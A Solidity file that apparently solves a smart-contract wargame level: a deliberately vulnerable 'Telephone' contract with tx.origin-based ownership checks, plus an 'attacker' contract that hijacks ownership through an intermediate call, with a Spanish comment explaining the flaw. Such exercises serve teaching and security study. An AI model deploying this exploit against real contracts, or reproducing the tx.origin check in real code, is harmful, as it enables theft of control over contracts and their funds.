// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract attacker {
    // La tx.originvariable global se refiere a la cuenta externa original que inició la transacción, mientras que msg.senderse refiere a la cuenta inmediata (puede ser externa u otra cuenta de contrato) que invoca la función. La tx.originvariable siempre se referirá a la cuenta externa mientras que msg.senderpuede ser un contrato o cuenta externa.
    Telephone telephone; 
    address owner;

    constructor(address _tp) {
        telephone = Telephone(_tp);
        owner = msg.sender;
    }

    function attack() external {
        telephone.changeOwner(owner);
    }
}